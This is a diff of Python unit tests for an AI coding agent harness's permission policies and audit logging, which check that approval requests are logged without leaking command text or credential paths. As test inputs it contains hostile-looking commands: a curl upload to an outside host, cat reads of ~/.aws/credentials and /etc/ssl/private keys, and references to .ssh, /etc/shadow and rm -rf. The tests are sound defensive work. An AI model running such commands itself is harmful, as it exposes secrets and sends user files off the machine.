@@ -95,16 +95,14 @@ console.log('RESULTS:' + JSON.stringify(results));
 """
 
 
-def run_policy_cases(
-    testcase: unittest.TestCase, policy_relative: str, cases: list[dict]
-) -> list:
-    """Execute a permission policy against synthetic tool inputs.
+def build_policy_node_modules(testcase: unittest.TestCase, fixture: Path) -> None:
+    """Populate fixture/node_modules with the pi-permissions library and its
+    peer dependencies, symlinked from the local Pi install.
 
-    Builds a self-contained fixture: the pi-permissions library is
-    copied in (Node refuses to type-strip files under node_modules, so
-    jiti transpiles it instead — exactly how Pi loads these policies),
-    its support packages are symlinked from the local Pi install, and
-    the policy plus permissions/lib are copied beside it.
+    Node refuses to type-strip files under node_modules, so jiti transpiles
+    it instead — exactly how Pi loads these policies. Skips the test (or
+    fails, under HARNESS_REQUIRE_POLICY_INTEGRATION=1) when the local Pi
+    install cannot supply these dependencies.
     """
     if not PI_PERMISSIONS_LIB.is_dir():
         if os.environ.get("HARNESS_REQUIRE_POLICY_INTEGRATION") == "1":
@@ -125,7 +123,6 @@ def run_policy_cases(
         testcase.skipTest(
             "pi-coding-agent package (peer dependencies) not found via PATH"
         )
-    fixture = retained_on_failure_tmpdir(testcase, "policy-integration-")
     node_modules = fixture / "node_modules"
     (node_modules / "@thurstonsand").mkdir(parents=True)
     (node_modules / "@earendil-works").mkdir()
@@ -151,6 +148,21 @@ def run_policy_cases(
         target = node_modules / entry.name
         if not target.exists():
             target.symlink_to(entry, target_is_directory=entry.is_dir())
+
+
+def run_policy_cases(
+    testcase: unittest.TestCase, policy_relative: str, cases: list[dict]
+) -> list:
+    """Execute a permission policy against synthetic tool inputs.
+
+    Builds a self-contained fixture: the pi-permissions library is
+    copied in (Node refuses to type-strip files under node_modules, so
+    jiti transpiles it instead — exactly how Pi loads these policies),
+    its support packages are symlinked from the local Pi install, and
+    the policy plus permissions/lib are copied beside it.
+    """
+    fixture = retained_on_failure_tmpdir(testcase, "policy-integration-")
+    build_policy_node_modules(testcase, fixture)
     policy_copy = fixture / Path(policy_relative).name
     shutil.copy2(ROOT / policy_relative, policy_copy)
     shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
@@ -1420,6 +1432,295 @@ assert(!TRIMMED_TOOLS.includes('edit'), 'edit NOT trimmed');
         if result.returncode != 0 and "bad option" in result.stdout:
             self.skipTest("Node.js on PATH cannot strip TypeScript types")
         self.assertEqual(result.returncode, 0, result.stdout)
+
+    def test_permission_audit_appender_writes_redacted_requests(self) -> None:
+        """permissions/lib/audit.ts: appends kind:'request' records to the
+        shared audit dir, honours PI_AUDIT=0, never throws, and the record
+        contains identifiers only — the redaction contract."""
+        script = """
+import { mkdtempSync, readdirSync, readFileSync, existsSync, writeFileSync } from 'node:fs';
+import { join } from 'node:path';
+import { tmpdir } from 'node:os';
+const assert = (cond, msg) => {
+  if (!cond) { console.error('ASSERT: ' + msg); process.exit(1); }
+};
+
+const agent = mkdtempSync(join(tmpdir(), 'audit-agent-'));
+process.env.PI_AGENT_DIR = agent;
+delete process.env.PI_AUDIT;
+const { logPermissionRequest } = await import('./permissions/lib/audit.ts');
+
+logPermissionRequest({
+  policy: 'protected path and secret access approval',
+  toolName: 'read',
+  rule: 'ssh-private-key',
+  decision: 'request',
+});
+const dir = join(agent, 'harness', 'audit');
+const files = readdirSync(dir);
+assert(files.length === 1 && /^audit-\\d{4}-\\d{2}-\\d{2}\\.jsonl$/.test(files[0]),
+  'daily audit file, got ' + JSON.stringify(files));
+const rec = JSON.parse(readFileSync(join(dir, files[0]), 'utf8').trim());
+assert(rec.kind === 'request', 'kind is request');
+assert(rec.policy && rec.toolName === 'read' && rec.rule === 'ssh-private-key', 'fields kept');
+assert(rec.decision === 'request', 'decision kept');
+assert(typeof rec.ts === 'number' && typeof rec.pid === 'number', 'ts and pid stamped');
+assert(!('path' in rec) && !('command' in rec) && !('content' in rec),
+  'no content-bearing fields');
+
+// Sanitizer: an absolute-path payload inside parentheses is stripped
+// (leaving the bounded category text), a relative-constant payload is
+// preserved verbatim, and an overlong rule is truncated rather than
+// dropped.
+logPermissionRequest({
+  policy: 'protected path and secret access approval',
+  toolName: 'read',
+  rule: 'system credential store (/etc/ssl/private/prod-signing-CANARY.pem)',
+  decision: 'request',
+});
+logPermissionRequest({
+  policy: 'protected path and secret access approval',
+  toolName: 'read',
+  rule: 'credential store (.ssh)',
+  decision: 'request',
+});
+logPermissionRequest({ policy: 'p', toolName: 'bash', rule: 'x'.repeat(500), decision: 'request' });
+const sanitizerLines = readFileSync(join(dir, files[0]), 'utf8').trim().split('\\n');
+const absoluteRec = JSON.parse(sanitizerLines.at(-3));
+assert(absoluteRec.rule === 'system credential store',
+  'absolute payload stripped, got ' + JSON.stringify(absoluteRec.rule));
+assert(!absoluteRec.rule.includes('/') && !absoluteRec.rule.includes('CANARY'),
+  'no path separator or filename survives, got ' + JSON.stringify(absoluteRec.rule));
+const relativeRec = JSON.parse(sanitizerLines.at(-2));
+assert(relativeRec.rule === 'credential store (.ssh)',
+  'relative payload kept verbatim, got ' + JSON.stringify(relativeRec.rule));
+const longRec = JSON.parse(sanitizerLines.at(-1));
+assert(longRec.rule.length === 200,
+  'overlong rule truncated to the cap, got length ' + longRec.rule.length);
+
+// Every REQUIRED BEHAVIOUR predicate from the fix brief, asserted
+// directly against sanitizeRule via logPermissionRequest.
+const cases = [
+  // Round-4 canary: ")" is a legal POSIX filename byte, so the payload's
+  // parens can be unbalanced. The allowlist rejects it either way.
+  ['system credential store (/etc/ssl/private/a)b-CANARY.pem)', 'system credential store'],
+  ['system credential store (/etc/ssl/private/dir)/sub/k-CANARY.pem)', 'system credential store'],
+  // Round-3 canary: ", " is a legal filename substring, not a delimiter.
+  ['system credential store (/etc/ssl/private/notes, secret-CANARY.pem)',
+    'system credential store'],
+  // Round-2 canary: the OS collision-rename shape "notes(1).pem".
+  ['system credential store (/etc/ssl/private/notes(1)-CANARY.pem)', 'system credential store'],
+  ['system credential store (/etc/ssl/private/k-CANARY.pem)', 'system credential store'],
+  ['Windows credential/system hive (c:/windows/panther/unattend.xml)', 'Windows credential/system hive'],
+  // Unterminated span: no closing paren, still fails the allowlist.
+  ['system credential store (/etc/ssl/private/unterminated',
+    'system credential store'],
+  // Bounded policy constants match BOUNDED_PAYLOAD and are kept verbatim.
+  ['credential store (.ssh)', 'credential store (.ssh)'],
+  ['credential file (.aws/credentials)', 'credential file (.aws/credentials)'],
+  ['credential or package-registry file (.npmrc)', 'credential or package-registry file (.npmrc)'],
+  ['browser credential/session store (Login Data)', 'browser credential/session store (Login Data)'],
+  ['environment variable exposure', 'environment variable exposure'],
+  // ACCEPTED TRADE-OFF: `inner` runs from the first '(' to the end, fails
+  // the allowlist, and the trailing identifier's label is lost with it.
+  // Deliberate — do NOT recover it by splitting on ', ' (round-3's bug).
+  ['credential store (.ssh), system credential store (/etc/ssl/private/k-CANARY.pem)',
+    'credential store'],
+  // Nothing survives redaction: never log an empty rule.
+  ['(/etc/shadow)', 'redacted'],
+  // A rule with no '(' at all is paren-free prose, kept as-is.
+  ['weird ) stray paren', 'weird ) stray paren'],
+];
+for (const [rule, expected] of cases) {
+  logPermissionRequest({ policy: 'p', toolName: 'bash', rule, decision: 'request' });
+}
+const caseLines = readFileSync(join(dir, files[0]), 'utf8').trim().split('\\n');
+const caseRecs = caseLines.slice(caseLines.length - cases.length).map((l) => JSON.parse(l));
+for (let i = 0; i < cases.length; i++) {
+  assert(caseRecs[i].rule === cases[i][1],
+    'predicate case ' + JSON.stringify(cases[i][0]) + ' -> got ' + JSON.stringify(caseRecs[i].rule) +
+    ', expected ' + JSON.stringify(cases[i][1]));
+}
+assert(!caseLines.join('\\n').includes('CANARY'), 'no CANARY marker survives any predicate case');
+
+// Kill switch: PI_AUDIT=0 writes nothing (read at call time).
+const beforeKillSwitch = readFileSync(join(dir, files[0]), 'utf8').trim().split('\\n').length;
+process.env.PI_AUDIT = '0';
+logPermissionRequest({ policy: 'p', toolName: 'bash', rule: 'r', decision: 'block' });
+const after = readFileSync(join(dir, files[0]), 'utf8').trim().split('\\n');
+assert(after.length === beforeKillSwitch, 'PI_AUDIT=0 suppresses writes');
+
+// Fail-open: a path whose parent is a regular file can never be a
+// directory (ENOTDIR), which fails fast on every platform.
+process.env.PI_AUDIT = '1';
+const blocker = join(agent, 'blocker');
+writeFileSync(blocker, 'x');
+process.env.PI_AGENT_DIR = join(blocker, 'child');
+logPermissionRequest({ policy: 'p', toolName: 'bash', rule: 'r', decision: 'block' });
+console.log('ok');
+"""
+        result = subprocess.run(
+            ["node", "--experimental-strip-types", "--input-type=module", "-e", script],
+            cwd=ROOT,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            check=False,
+        )
+        if result.returncode != 0 and "bad option" in result.stdout:
+            self.skipTest("Node.js on PATH cannot strip TypeScript types")
+        self.assertEqual(result.returncode, 0, result.stdout)
+
+    def test_audit_observer_records_sessions_and_outcomes(self) -> None:
+        """audit-log.ts: session records on session_start, outcome records
+        with exact reason classes on tool_execution_end, redaction of tool
+        output, pruning wired, PI_AUDIT=0 kill switch."""
+        script = """
+import { mkdtempSync, mkdirSync, writeFileSync, readdirSync, readFileSync, utimesSync } from 'node:fs';
+import { join } from 'node:path';
+import { tmpdir } from 'node:os';
+const assert = (cond, msg) => {
+  if (!cond) { console.error('ASSERT: ' + msg); process.exit(1); }
+};
+const agent = mkdtempSync(join(tmpdir(), 'audit-obs-'));
+process.env.PI_AGENT_DIR = agent;
+delete process.env.PI_AUDIT;
+const { default: register, classifyOutcome } = await import('./extensions/audit-log.ts');
+
+// Classification is exact against the pinned pi-permissions formats.
+assert(classifyOutcome('Blocked by permission hook direct deletion approval\\n\\nrm -rf', true) === 'policy-block', 'policy-block');
+assert(classifyOutcome('Blocked bash (direct deletion approval): user confirmation required but no UI available.', true) === 'no-ui', 'no-ui');
+assert(classifyOutcome('Blocked by user via permission hook outbound transmission approval', true) === 'user-rejected', 'user-rejected');
+assert(classifyOutcome('Blocked something unrecognizable', true) === 'other', 'other');
+assert(classifyOutcome('command not found: foo', true) === 'ran', 'ordinary error is not a block');
+assert(classifyOutcome('ok', false) === 'ran', 'success runs');
+
+// Seed a receipt so the session record can carry provenance.
+mkdirSync(join(agent, 'harness'), { recursive: true });
+writeFileSync(join(agent, 'harness', '.managed-state.json'), JSON.stringify({
+  version: 3, harnessVersion: '0.1.0-rc.8',
+  permissions: [{ source: 'a', target: 'b', sha256: 'abc123' }],
+}));
+
+const handlers = new Map();
+register({ on: (event, handler) => handlers.set(event, handler) });
+assert(handlers.has('session_start') && handlers.has('tool_execution_end'), 'both events observed');
+
+await handlers.get('session_start')({}, {
+  hasUI: false, model: { provider: 'llama.cpp', id: 'qwen3.8-27b' },
+});
+const SECRET = 'CANARY-OUTPUT-77aa';
+await handlers.get('tool_execution_end')({
+  toolCallId: 'tc_1', toolName: 'bash', isError: true,
+  result: { content: [{ type: 'text',
+    text: 'Blocked bash (direct deletion approval): user confirmation required but no UI available.' }] },
+}, {});
+await handlers.get('tool_execution_end')({
+  toolCallId: 'tc_2', toolName: 'bash', isError: false,
+  result: { content: [{ type: 'text', text: SECRET }] },
+}, {});
+
+const dir = join(agent, 'harness', 'audit');
+const file = readdirSync(dir).find((f) => f.startsWith('audit-'));
+const raw = readFileSync(join(dir, file), 'utf8');
+const recs = raw.trim().split('\\n').map((l) => JSON.parse(l));
+const session = recs.find((r) => r.kind === 'session');
+assert(session && session.hasUI === false && session.provider === 'llama.cpp', 'session record');
+assert(session.harness && session.harness.permissionsSha256.includes('abc123'), 'receipt provenance');
+const blocked = recs.find((r) => r.kind === 'outcome' && r.toolCallId === 'tc_1');
+assert(blocked.result === 'blocked' && blocked.reason === 'no-ui', 'no-ui outcome');
+const ran = recs.find((r) => r.kind === 'outcome' && r.toolCallId === 'tc_2');
+assert(ran.result === 'ran', 'ran outcome');
+assert(!raw.includes(SECRET), 'REDACTION: tool output never reaches the log');
+
+// PI_AUDIT=0 kill switch: both handlers must write nothing while set.
+const beforeKillSwitchLines = readFileSync(join(dir, file), 'utf8').trim().split('\\n').length;
+process.env.PI_AUDIT = '0';
+await handlers.get('session_start')({}, {
+  hasUI: false, model: { provider: 'llama.cpp', id: 'qwen3.8-27b' },
+});
+await handlers.get('tool_execution_end')({
+  toolCallId: 'tc_3', toolName: 'bash', isError: false,
+  result: { content: [{ type: 'text', text: 'should not be written' }] },
+}, {});
+const afterKillSwitchLines = readFileSync(join(dir, file), 'utf8').trim().split('\\n').length;
+assert(afterKillSwitchLines === beforeKillSwitchLines,
+  'PI_AUDIT=0 suppresses both handlers, got ' + afterKillSwitchLines + ' vs ' + beforeKillSwitchLines);
+
+// Restore the switch and confirm writing resumes, proving this is a
+// live switch rather than a handler that silently stopped working.
+delete process.env.PI_AUDIT;
+await handlers.get('tool_execution_end')({
+  toolCallId: 'tc_4', toolName: 'bash', isError: false,
+  result: { content: [{ type: 'text', text: 'writes again' }] },
+}, {});
+const afterRestoreLines = readFileSync(join(dir, file), 'utf8').trim().split('\\n').length;
+assert(afterRestoreLines === afterKillSwitchLines + 1,
+  'writing resumes once PI_AUDIT is unset, got ' + afterRestoreLines + ' vs ' + afterKillSwitchLines);
+
+// A malformed event must not throw.
+await handlers.get('tool_execution_end')({}, {});
+console.log('ok');
+"""
+        result = subprocess.run(
+            ["node", "--experimental-strip-types", "--input-type=module", "-e", script],
+            cwd=ROOT,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            check=False,
+        )
+        if result.returncode != 0 and "bad option" in result.stdout:
+            self.skipTest("Node.js on PATH cannot strip TypeScript types")
+        self.assertEqual(result.returncode, 0, result.stdout)
+
+    def test_audit_observer_and_permission_appender_share_one_file(self) -> None:
+        """The observer's session/outcome records and the permission
+        policies' request records must interleave in the SAME daily audit
+        file, never split into two -- that correlation is the point."""
+        script = """
+import { mkdtempSync, readdirSync, readFileSync } from 'node:fs';
+import { join } from 'node:path';
+import { tmpdir } from 'node:os';
+const assert = (cond, msg) => {
+  if (!cond) { console.error('ASSERT: ' + msg); process.exit(1); }
+};
+const agent = mkdtempSync(join(tmpdir(), 'audit-shared-'));
+process.env.PI_AGENT_DIR = agent;
+delete process.env.PI_AUDIT;
+const { default: register } = await import('./extensions/audit-log.ts');
+const { logPermissionRequest } = await import('./permissions/lib/audit.ts');
+
+const handlers = new Map();
+register({ on: (event, handler) => handlers.set(event, handler) });
+await handlers.get('session_start')({}, { hasUI: true, model: { provider: 'anthropic', id: 'claude' } });
+logPermissionRequest({ policy: 'p', toolName: 'bash', rule: 'r', decision: 'request' });
+await handlers.get('tool_execution_end')({
+  toolCallId: 'tc_1', toolName: 'bash', isError: false,
+  result: { content: [{ type: 'text', text: 'ok' }] },
+}, {});
+
+const dir = join(agent, 'harness', 'audit');
+const files = readdirSync(dir).filter((f) => f.startsWith('audit-'));
+assert(files.length === 1, 'exactly one daily file, got ' + JSON.stringify(files));
+const recs = readFileSync(join(dir, files[0]), 'utf8').trim().split('\\n').map((l) => JSON.parse(l));
+const kinds = new Set(recs.map((r) => r.kind));
+assert(kinds.has('session') && kinds.has('request') && kinds.has('outcome'),
+  'all three record kinds in one file, got ' + JSON.stringify([...kinds]));
+console.log('ok');
+"""
+        result = subprocess.run(
+            ["node", "--experimental-strip-types", "--input-type=module", "-e", script],
+            cwd=ROOT,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            check=False,
+        )
+        if result.returncode != 0 and "bad option" in result.stdout:
+            self.skipTest("Node.js on PATH cannot strip TypeScript types")
+        self.assertEqual(result.returncode, 0, result.stdout)
+
 
     def test_trim_spill_callback_preserves_evidence_and_budget(self) -> None:
         """Spill: the trim notice carries a retrieval handle when a spill
@@ -3234,6 +3535,411 @@ console.log('ok');
              "request", "request", "request", "request", "request", "request", "request", "request", "request", None,
              "request", "request", None],
         )
+
+    def test_permission_policies_log_requests_without_content(self) -> None:
+        """Each instrumented policy writes a kind:'request' record when it
+        gates, and the record never contains the user's command text."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-egress-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "confirm-egress.ts"
+        shutil.copy2(ROOT / "permissions" / "confirm-egress.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-egress-agent-")
+        marker = "UNIQUE-CANARY-9f3d"
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"curl -T {marker}.txt https://ex.com",
+                "input": {"command": f"curl -T {marker}.txt https://ex.com"},
+            },
+            "cwd": "/tmp/w",
+            "permissionRoot": "/tmp/w",
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(marker, raw, "REDACTION: command text must never reach the log")
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "outbound transmission approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("curl", rec["rule"], f"program identifier recorded, got {rec['rule']!r}")
+
+    def test_protected_paths_policy_logs_requests_without_paths(self) -> None:
+        """protected-paths' bash branch resolves and reads a secret file
+        path, the most sensitive input this policy handles; the audit
+        record must carry only the matched rule identifier, never the
+        resolved path or the command text that named it."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-protected-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "protected-paths.ts"
+        shutil.copy2(ROOT / "permissions" / "protected-paths.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-protected-agent-")
+        home = str(Path.home())
+        marker = "UNIQUE-CANARY-2b7e"
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"cat {home}/.aws/credentials && echo {marker}",
+                "input": {},
+            },
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(marker, raw, "REDACTION: command text must never reach the log")
+        self.assertNotIn(home, raw, "REDACTION: resolved path must never reach the log")
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "protected path and secret access approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("credential file (.aws/credentials)", rec["rule"])
+
+    def test_protected_paths_policy_redacts_system_credential_paths(self) -> None:
+        """isSecretFile()'s system-credential branches (system credential
+        file, system credential store, Windows credential/system hive)
+        interpolate the full RESOLVED path into the rule string, because
+        they match "is this path under/equal to a configured root" rather
+        than "does this path equal a configured constant" — unlike every
+        other branch, there is no bounded relative identifier available.
+        That full path is correct and wanted in the human-facing approval
+        prompt, but audit.ts's sanitizer must still strip it before the
+        record hits disk. This is the regression test for that leak: it
+        drives a command referencing a uniquely named file under
+        /etc/ssl/private (a SYSTEM_CREDENTIAL_DIRECTORIES root) and greps
+        the raw audit bytes for the filename and the directory."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-syscred-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "protected-paths.ts"
+        shutil.copy2(ROOT / "permissions" / "protected-paths.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-syscred-agent-")
+        marker = "CANARY-7fa1"
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"cat /etc/ssl/private/{marker}-signing-key.pem",
+                "input": {},
+            },
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(
+            marker, raw,
+            "REDACTION: resolved system-credential filename must never reach the log",
+        )
+        self.assertNotIn(
+            "/etc/ssl/private", raw,
+            "REDACTION: resolved system-credential directory must never reach the log",
+        )
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "protected path and secret access approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("system credential store", rec["rule"])
+
+    def test_protected_paths_policy_redacts_parenthesized_filenames(self) -> None:
+        """Canary regression test for a stripAbsolutePathPayloads escape:
+        audit.ts's old sanitizer found parens with
+        /\\s*\\(([^()]*)\\)/g. [^()]* cannot cross an embedded parenthesis,
+        so a filename shaped like "notes(1)-CANARY.pem" makes the regex
+        match the INNER "(1)" (relative, so preserved) and never see the
+        enclosing span — the full absolute path then survives untouched.
+        "name(1).ext" is an ordinary filename shape on macOS and Windows
+        (Finder/Explorer's default collision-rename pattern), so this is a
+        live leak, not a contrived edge case. This test must FAIL against
+        the pre-fix regex-based sanitizer and PASS once audit.ts scans each
+        segment for the first "(" and last ")" instead."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-parens-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "protected-paths.ts"
+        shutil.copy2(ROOT / "permissions" / "protected-paths.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-parens-agent-")
+        marker = "CANARY-9b2c"
+        # /etc/ssl/private is a SYSTEM_CREDENTIAL_DIRECTORIES root; the
+        # filename's embedded "(1)" is what breaks the old regex.
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"cat '/etc/ssl/private/notes(1)-{marker}.pem'",
+                "input": {},
+            },
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(
+            marker, raw,
+            "REDACTION: filename with embedded parentheses must not defeat "
+            "the sanitiser and leak into the raw audit file",
+        )
+        self.assertNotIn(
+            "/etc/ssl/private", raw,
+            "REDACTION: resolved system-credential directory must never "
+            "reach the log",
+        )
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "protected path and secret access approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("system credential store", rec["rule"])
+
+    def test_protected_paths_policy_redacts_comma_space_filenames(self) -> None:
+        """Canary regression test for a THIRD stripAbsolutePathPayloads
+        escape: round 2's fix split the rule on the segment separator
+        ", " before scanning each piece for a bounded first-"("/last-")"
+        span. But ", " is a legal substring of an ordinary filename too,
+        and it is indistinguishable from the separator once both are the
+        same two characters. A filename containing ", " (e.g.
+        "notes, secret.pem") gets cut in half by split(", "): the first
+        half has "(" but no ")", the second half has ")" but no "(", both
+        hit the early-return guard unchanged, and rejoining reconstructs
+        the original absolute path byte-for-byte. This test must FAIL
+        against the round-2 split-based sanitizer and PASS once audit.ts
+        scans the whole rule with a single left-to-right parenthesis-depth
+        walk instead of splitting on any delimiter."""
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-commaspace-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "protected-paths.ts"
+        shutil.copy2(ROOT / "permissions" / "protected-paths.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-commaspace-agent-")
+        marker = "CANARY-4e1a"
+        # /etc/ssl/private is a SYSTEM_CREDENTIAL_DIRECTORIES root; the
+        # filename's embedded ", " is what breaks the round-2 split-based
+        # sanitizer.
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"cat '/etc/ssl/private/notes, secret-{marker}.pem'",
+                "input": {},
+            },
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
+        raw = files[0].read_text(encoding="utf-8")
+        self.assertNotIn(
+            marker, raw,
+            "REDACTION: filename with embedded comma-space must not defeat "
+            "the sanitiser and leak into the raw audit file",
+        )
+        self.assertNotIn(
+            "/etc/ssl/private", raw,
+            "REDACTION: resolved system-credential directory must never "
+            "reach the log",
+        )
+        rec = json.loads(raw.strip().splitlines()[-1])
+        self.assertEqual(rec["kind"], "request")
+        self.assertEqual(rec["decision"], "request")
+        self.assertEqual(rec["policy"], "protected path and secret access approval")
+        self.assertEqual(rec["toolName"], "bash")
+        self.assertIn("system credential store", rec["rule"])
+
+    def test_protected_paths_policy_redacts_unmatched_close_paren_filenames(self) -> None:
+        """Canary regression test for a FOURTH stripAbsolutePathPayloads
+        escape: round 3's fix walked the rule with a parenthesis-DEPTH
+        scan, which assumes every ")" in the payload is balanced by an
+        earlier "(". ")" is a legal POSIX filename byte, so a filename
+        like "a)b.pem" closes the enclosing span early: the depth returns
+        to 0 mid-path, the prefix is classified as absolute and dropped,
+        and the REMAINDER of the path ("b-CANARY.pem)") is emitted
+        verbatim at depth 0 — a leak.
+
+        Every denylist round (strip the recognised bad payload) died to an
+        ordinary filename, because a filename can contain any byte. The
+        fix inverts the test into an ALLOWLIST: a parenthesised payload is
+        emitted only when it provably matches a bounded identifier grammar
+        (BOUNDED_PAYLOAD), otherwise only the category label is logged. No
+        filename can appear, however hostile, because nothing reaches the
+        output unless it matched. This test must FAIL against the round-3
+        depth-scan sanitizer and PASS once audit.ts allowlists the payload.
+        """
+        fixture = retained_on_failure_tmpdir(self, "policy-audit-closeparen-")
+        build_policy_node_modules(self, fixture)
+        policy_copy = fixture / "protected-paths.ts"
+        shutil.copy2(ROOT / "permissions" / "protected-paths.ts", policy_copy)
+        shutil.copytree(ROOT / "permissions" / "lib", fixture / "lib")
+
+        agent = retained_on_failure_tmpdir(self, "policy-audit-closeparen-agent-")
+        marker = "CANARY-6d5f"
+        # /etc/ssl/private is a SYSTEM_CREDENTIAL_DIRECTORIES root; the
+        # filename's UNMATCHED ")" is what breaks the round-3 depth scan.
+        case = {
+            "tool": {
+                "toolName": "bash",
+                "command": f"cat '/etc/ssl/private/a)b-{marker}.pem'",
+                "input": {},
+            },
+        }
+        env = dict(os.environ)
+        env["PI_AGENT_DIR"] = str(agent)
+        env.pop("PI_AUDIT", None)
+        result = subprocess.run(
+            [
+                "node",
+                "--input-type=module",
+                "-e",
+                POLICY_HARNESS_SCRIPT,
+                str(policy_copy),
+                json.dumps([case]),
+            ],
+            cwd=fixture,
+            text=True,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            env=env,
+            check=False,
+        )
+        self.assertEqual(result.returncode, 0, result.stdout)
+        self.assertIn('RESULTS:["request"]', result.stdout)
+
+        audit_dir = agent / "harness" / "audit"
+        files = list(audit_dir.iterdir())
+        self.assertEqual(len(files), 1, files)
